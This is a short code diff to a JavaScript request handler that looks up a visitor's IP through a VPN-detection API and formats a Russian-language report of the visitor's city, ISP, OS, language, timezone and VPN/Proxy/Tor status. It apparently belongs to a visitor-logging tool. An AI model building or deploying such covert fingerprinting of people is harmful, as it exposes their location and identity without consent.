@@ -59,9 +59,13 @@ export default async function handler(req, res) {
         const vpnResp = await fetch(`https://vpnapi.io/api/${ip}?key=${VPNAPI_KEY}`, { timeout: 10000 });
         const vpnData = await vpnResp.json();
         isp = vpnData.network?.autonomous_system_organization || isp;
-        if (vpnData.security && (vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor)) {
-          vpnWarning = "⚠ Пользователь использует VPN/Proxy/Tor";
-        }
+        
+        const { vpn, proxy, tor } = vpnData.security || {};
+
+        if (vpn) vpnWarning = "⚠ VPN";
+        else if (proxy) vpnWarning = "⚠ Proxy";
+        else if (tor) vpnWarning = "⚠ Tor";
+
       } catch (e) {
         console.error("VPNAPI error:", e);
       }
@@ -80,7 +84,6 @@ export default async function handler(req, res) {
 <b>🏘 Город:</b> ${escapeHtml(city)}
 <b>🏢 Провайдер:</b> ${escapeHtml(isp)}
 ${vpnWarning ? `<b>${escapeHtml(vpnWarning)}</b>\n` : ""}
-
 <b>💻 ОС:</b> ${escapeHtml(os || "неизвестно")}
 <b>🌐 Язык:</b> ${escapeHtml(language || "неизвестно")}
 <b>⏰ Часовой пояс:</b> ${escapeHtml(timezone || "неизвестно")}
